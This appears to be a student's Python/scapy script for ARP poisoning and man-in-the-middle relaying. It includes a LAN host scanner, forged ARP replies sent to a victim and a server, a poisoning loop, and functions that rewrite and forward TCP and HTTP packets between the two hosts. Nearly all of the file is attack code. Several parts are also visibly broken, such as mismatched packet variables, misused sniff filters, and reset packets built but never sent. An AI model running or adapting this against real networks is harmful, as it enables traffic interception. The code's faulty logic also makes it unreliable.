import scapy.all as sc;
import argparse;
import time;

# TODO:
# - Mitm optie maken die je automatisch mitm maakt
# - Silent vs All out options

### This is the file for ARP poisoning. I'm not sure if it works or how to test it :) 
# first listen to ARP broadcast, then respond to victim, dan spam server with arp request, send victim a lot of arp responses and hope that we are the quickest.

# Example run code that should do something, where x is ip range: 
# python ARPpoisoning.py --scan x 
# When specific victim and server are found, where y and z are ip adresses: 
# python ARPpoisoning.py --victim y --server z


## First is my attempt at scanning the network. I'm not sure if this work and if this is what we wanted it to do if it does work.
# Scanning network for devices, this returns (or is supposed to return) all live hosts in a given range 'ip'.
def network_scan(ip):
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    final_packet = broadcast / arp
    # Note that sent is the ARP request I sent, received is the ARP reply.
    packet_pairs = sc.srp(final_packet, timeout=2, verbose=False)[0]
    hosts = []
    for sent, received in packet_pairs:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    return hosts

## Here is where the main parts of the ARP poisoning is supposed to happen. 
# 1. We need to be able to start the poisoning attack.
# 2. We need to be able to get a current MAC adress. 
# 3. we need to stop the attack in a proper way.

# (1.) Start the poisoning attack by sending fake ARP replies.
def poison(victim_ip, poison_ip, victim_mac):
    attacker_mac = sc.get_if_hwaddr(sc.conf.iface)
    fake_packet = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=poison_ip, hwsrc=attacker_mac)
    sc.send(fake_packet, verbose=False)

# (2.) Get the MAC adress of a given IP adress
def get_mac(ip):
    # First we do the same as in network scan.
    arp = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp
    packet_pairs = sc.srp(packet, timeout=2, verbose=False)[0]
    # Now get MAC adress if something replies
    for sent, received in packet_pairs:
        return received.hwsrc
    return None

# (3.) Sends real ARP replies to stop and clean up the attack.
def stop_attack(victim_ip, real_ip, victim_mac, real_mac):
    packet = sc.Ether(dst=victim_mac)/sc.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac)
    sc.send(packet, count=4, verbose=False)

## Now to start the attack, keep it goining, and stop it when we want.
# We try to keep the ARP table of the victim poisoned by sending packets in a loop.
def arp_poisoning(victim_ip, server_ip, mode):
    print("pre try", victim_ip, server_ip)
    try:
        victim_mac = get_mac(victim_ip)
        server_mac = get_mac(server_ip)
        print("victim: ", victim_mac)
        print("victimip: ", victim_ip)
        print("server: ", server_mac)
        print("serverip: ", server_ip)

        if mode == "silent":
            poison(victim_ip, server_ip, victim_mac)
            poison(server_ip, victim_ip, server_mac)
        else:
            for i in range(5):  # run the loop 5 times
                poison(victim_ip, server_ip, victim_mac)
                poison(server_ip, victim_ip, server_mac)
                print("i:", i)
                #time.sleep(2)
    except KeyboardInterrupt:
        pass
    finally:
        stop_attack(victim_ip, server_ip, victim_mac, server_mac)
        stop_attack(server_ip, victim_ip, server_mac, victim_mac)
        return server_mac, victim_mac


## Try to do de syn-ack response poging 5
# 
def three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP):
    # Forward SYN packet from victem to server, adjust packet to make the server think this is the victim
    ether = sc.Ether(src=attackerMac, dst=serverMac)
    ip = sc.IP(src=attackerIP, dst=serverIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    if pkt.haslayer(sc.Raw):
        raw = sc.Raw(load=pkt[sc.Raw].load)
        new_pkt = ether / ip / tcp / raw
    else:
        new_pkt = ether / ip / tcp
    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)

    # Sniff for SYN-ACK from server
    ack = sc.sniff(lfilter=is_server_ack(pkt, serverIP, attackerIP), count=1, timeout=5)
    if not ack:
        ether_back = sc.Ether(src=attackerMac, dst=victimMac)
        ip_back = sc.IP(src=attackerIP, dst=victimIP)
        tcp_back = sc.TCP(
            seq=pkt[sc.TCP].seq + 1,
            ack=pkt[sc.TCP].seq,
            flags='R'
        )
        return False


    # Forward adjusted SYN-ACK to victim
    ether_back = sc.Ether(src=attackerMac, dst=victimMac)
    ip_back = sc.IP(src=attackerIP, dst=victimIP)
    tcp_back = sc.TCP(
        sport=ack[sc.TCP].sport,
        dport=ack[sc.TCP].dport,
        seq=ack[sc.TCP].seq,
        ack=ack[sc.TCP].ack,
        flags=ack[sc.TCP].flags
    )
    if pkt.haslayer(sc.Raw):
        raw_back = sc.Raw(load=pkt[sc.Raw].load)
        new_pkt = ether_back / ip_back / tcp_back / raw_back
    else:
        new_pkt_back = ether_back / ip_back / tcp_back
    sc.sendp(new_pkt_back, iface=sc.conf.iface, verbose=False)

    ## Forward adjusted ACK from victim to server
    # Sniff for ACK from victim
    ack = sc.sniff(lfilter=is_victim_ack(pkt, victimIP, attackerIP), count=1, timeout=5)
    if not ack:
        ether_back = sc.Ether(src=attackerMac, dst=serverMac)
        ip_back = sc.IP(src=attackerIP, dst=serverIP)
        tcp_back = sc.TCP(
            seq=ack[sc.TCP].seq + 1,
            ack=ack[sc.TCP].seq,
            flags='R'
        )
        return False

    # Forward adjusted ACK to server
    ether_back = sc.Ether(src=attackerMac, dst=serverMac)
    ip_back = sc.IP(src=attackerIP, dst=serverIP)
    tcp_back = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    if pkt.haslayer(sc.Raw):
        raw_back = sc.Raw(load=pkt[sc.Raw].load)
        new_pkt = ether_back / ip_back / tcp_back / raw_back
    else:
        new_pkt_back = ether_back / ip_back / tcp_back
    sc.sendp(new_pkt_back, iface=sc.conf.iface, verbose=False)

    return True

        
def is_server_ack(pkt, serverIP, attackerIP):
    return (
        pkt.haslayer(sc.TCP)
        and pkt[sc.IP].src == serverIP
        and pkt[sc.IP].dst == attackerIP
        and pkt[sc.TCP].flags == "SA"
    )

def is_victim_ack(pkt, victimIP, attackerIP):
    return (
        pkt.haslayer(sc.TCP)
        and pkt[sc.IP].src == victimIP
        and pkt[sc.IP].dst == attackerIP
        and pkt[sc.TCP].flags == "A"
    )

## forwarding method
def own_server(clientIP, serverIP, serverMac, attackerMac, attackerIP):
    while (True):
        nxt_pkt = sc.sniff(filter="http")
        if (nxt_pkt[sc.IP].src == clientIP):
            forward_to_server(nxt_pkt, attackerMac, attackerIP, serverMac, serverIP)
            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
                return
        if (nxt_pkt[sc.IP].src == serverIP):
            forward_to_client(nxt_pkt, attackerMac, attackerIP, serverMac, serverIP)
            if (is_rst(nxt_pkt) or is_tcp_fin(nxt_pkt)):
                return

def is_rst(pkt):
    return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags

def is_tcp_fin(pkt):
    return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags

    
def forward_to_server(pkt, attackerMac, attackerIP, serverMac, serverIP):
    ether = sc.Ether(src=attackerMac, dst=serverMac)
    ip = sc.IP(src=attackerIP, dst=serverIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    if pkt.haslayer(sc.Raw):
        raw = sc.Raw(load=pkt[sc.Raw].load)
        new_pkt = ether / ip / tcp / raw
    else:
        new_pkt = ether / ip / tcp
    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)


def forward_to_client(pkt, attackerMac, attackerIP, victimMac, victimIP):
    ether = sc.Ether(src=attackerMac, dst=victimMac)
    ip = sc.IP(src=attackerIP, dst=victimIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    if pkt.haslayer(sc.Raw):
        raw = sc.Raw(load=pkt[sc.Raw].load)
        new_pkt = ether / ip / tcp / raw
    else:
        new_pkt = ether / ip / tcp
    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
